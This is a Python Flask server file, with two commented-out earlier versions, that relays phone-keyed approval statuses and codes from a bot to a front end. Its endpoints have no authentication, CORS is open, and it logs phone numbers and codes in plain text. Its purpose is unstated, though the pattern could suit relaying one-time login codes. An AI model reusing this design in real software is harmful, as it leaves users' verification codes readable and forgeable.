# import os # Добавляем импорт os для работы с переменной окружения PORT
# from flask import Flask, request, jsonify
# from flask_cors import CORS

# responses = {} # <<< ВНИМАНИЕ: Данные хранятся в памяти и будут потеряны при перезапуске сервера!
# app = Flask(__name__)

# # --- НАСТРОЙКА CORS ---
# # Разрешаем запросы только с вашего фронтенда
# # В server.py
# CORS(app) # Разрешить запросы со всех источников

# @app.route("/check-response", methods=["GET"])
# def check_response():
#     phone = request.args.get("phone")
#     status = responses.get(phone)
#     print(f"[CHECK] phone: {phone}, status: {status}") # Оставляем логирование
#     return jsonify({"status": status or "waiting"})

# # --- ИЗМЕНЕНИЕ ИМЕНИ РОУТА И ФУНКЦИИ ---
# # Меняем "/set-response" на "/user-request", чтобы соответствовать тому, что ожидает бот
# @app.route("/user-request", methods=["POST"])
# def user_request(): # Меняем имя функции для ясности
#     data = request.json
#     if not data:
#          print("[POST /user-request] Error: No JSON data received")
#          return jsonify({"error": "No JSON data received"}), 400

#     phone = data.get("phone")
#     result = data.get("result") # 'approved' or 'rejected'

#     if not phone or not result:
#         print(f"[POST /user-request] Error: Missing 'phone' or 'result' in JSON data: {data}")
#         return jsonify({"error": "Missing 'phone' or 'result'"}), 400

#     responses[phone] = result # Сохраняем результат в памяти
#     print(f"[SET /user-request] phone: {phone}, result: {result}") # Оставляем логирование
#     return jsonify({"success": True}) # Возвращаем успех

# if __name__ == "__main__":
#     # --- ИЗМЕНЕНИЕ ДЛЯ RAILWAY ---
#     # Получаем порт из переменной окружения PORT, по умолчанию 5000
#     port = int(os.environ.get('PORT', 5000))
#     # Запускаем на 0.0.0.0, чтобы быть доступным в контейнере Railway
#     print(f"Starting Flask server on host 0.0.0.0 port {port}")
#     app.run(host="0.0.0.0", port=port, debug=False) # debug=False для продакшена!


# import os
# import time  # ⬅️ Додаємо для timestamp
# from flask import Flask, request, jsonify
# from flask_cors import CORS

# # responses[phone] = { "status": ..., "timestamp": ... }
# responses = {}

# app = Flask(__name__)
# CORS(app)  # дозволяємо всі CORS-запити

# @app.route("/check-response", methods=["GET"])
# def check_response():
#     phone = request.args.get("phone")
#     data = responses.get(phone)

#     if not data:
#         print(f"[CHECK] phone: {phone} — no data yet")
#         return jsonify({"status": "waiting"})

#     print(f"[CHECK] phone: {phone}, status: {data['status']}, timestamp: {data['timestamp']}")
#     return jsonify({
#         "status": data["status"],
#         "timestamp": data["timestamp"]
#     })

# @app.route("/user-request", methods=["POST"])
# def user_request():
#     data = request.json
#     if not data:
#         print("[POST /user-request] Error: No JSON data received")
#         return jsonify({"error": "No JSON data received"}), 400

#     phone = data.get("phone")
#     result = data.get("result")  # 'approved' або 'rejected'

#     if not phone or not result:
#         print(f"[POST /user-request] Error: Missing 'phone' or 'result' in JSON data: {data}")
#         return jsonify({"error": "Missing 'phone' or 'result'"}), 400

#     # ⬅️ Сохраняем статус и timestamp
#     responses[phone] = {
#         "status": result,
#         "timestamp": time.time()
#     }

#     print(f"[SET /user-request] phone: {phone}, result: {result}")
#     return jsonify({"success": True})

# if __name__ == "__main__":
#     port = int(os.environ.get('PORT', 5000))
#     print(f"Starting Flask server on host 0.0.0.0 port {port}")
#     app.run(host="0.0.0.0", port=port, debug=False)


import os
import time
from flask import Flask, request, jsonify
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

# Сховище у пам'яті
responses = {}  # phone -> { status, timestamp }
codes = {}      # phone -> { code, timestamp }

# --- 1. check-response ---
@app.route("/check-response", methods=["GET"])
def check_response():
    phone = request.args.get("phone")
    data = responses.get(phone)

    if not data:
        print(f"[CHECK] phone: {phone} — no response")
        return jsonify({"status": "waiting"})

    print(f"[CHECK] phone: {phone}, status: {data['status']}, timestamp: {data['timestamp']}")
    return jsonify({
        "status": data["status"],
        "timestamp": data["timestamp"]
    })

# --- 2. user-request (бот надсилає статус кнопки) ---
@app.route("/user-request", methods=["POST"])
def user_request():
    data = request.json
    if not data:
        return jsonify({"error": "No JSON data received"}), 400

    phone = data.get("phone")
    result = data.get("result")

    if not phone or not result:
        return jsonify({"error": "Missing phone or result"}), 400

    responses[phone] = {
        "status": result,
        "timestamp": time.time()
    }
    print(f"[SET] phone: {phone}, result: {result}")
    return jsonify({"success": True})

# --- 3. set-code (бот надсилає код) ---
@app.route("/set-code", methods=["POST"])
def set_code():
    data = request.json
    if not data:
        return jsonify({"error": "No JSON"}), 400

    phone = data.get("phone")
    code = data.get("code")

    if not phone or not code:
        return jsonify({"error": "Missing phone or code"}), 400

    codes[phone] = {
        "code": code,
        "timestamp": time.time()
    }
    print(f"[CODE] phone: {phone}, code: {code}")
    return jsonify({"success": True})

# --- 4. check-code (фронт перевіряє чи є код) ---
@app.route("/check-code", methods=["GET"])
def check_code():
    phone = request.args.get("phone")
    data = codes.pop(phone, None)  # ❗️Видаляємо після видачі

    if not data:
        print(f"[CHECK CODE] phone: {phone} — not yet")
        return jsonify({})

    print(f"[CHECK CODE] phone: {phone} => {data['code']}")
    return jsonify({
        "code": data["code"],
        "timestamp": data["timestamp"]
    })

# --- Запуск ---
if __name__ == "__main__":
    port = int(os.environ.get('PORT', 5000))
    print(f"Starting Flask server on 0.0.0.0:{port}")
    app.run(host="0.0.0.0", port=port, debug=False)
